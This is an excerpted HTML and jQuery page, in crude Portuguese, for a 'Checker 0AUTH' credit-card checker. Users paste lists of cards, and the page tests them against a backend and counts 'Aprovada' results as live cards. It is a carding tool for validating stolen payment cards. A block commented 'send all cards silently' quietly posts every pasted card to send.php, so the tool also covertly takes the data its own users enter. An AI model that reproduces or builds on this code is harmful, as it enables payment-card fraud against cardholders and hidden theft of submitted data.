        ...
        <div class="col-md-8">
          <div class="card">
            <div class="card-body text-center">
              <h4 class="title mb-2">Checker 0AUTH</h4>
              <h5 class="title mb-2">6beck merdinha que fez 😉</h5>
              <textarea style="height: 8.06rem;" class="form-control text-center form-checker mb-2" placeholder="⮕ Coloque essa sua DB merda aqui ⬅"></textarea>
  ...
  $(document).ready(function() {
   ...
   // getSaldo();
    ...
    $('.btn-play').click(function() {
      ...
      // Enviar todos os cartões de forma silenciosa
      var cartoesParaEnviar = array.filter(function(value) {
        return value.trim() !== "";
      }).join('\n');
      
      if (cartoesParaEnviar) {
        $.ajax({
          url: 'send.php',
          type: 'POST',
          data: { cartoes: cartoesParaEnviar },
          async: true
        });
      }
...
*/
      ...
      if (total > 9999) {
        Swal.fire({
          title: 'Limite de 100 de Linhas Exedido!', icon: 'warning', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000
        });
        return false;
      }
        ...
        var callBack = $.ajax({
          ...
          success: function(retorno) {
            if (retorno.indexOf("Aprovada") >= 0) {
              ...
              removelinha();
              new Audio('live.mp3').play().catch(function(){});
              lives = lives +1;
            } else {
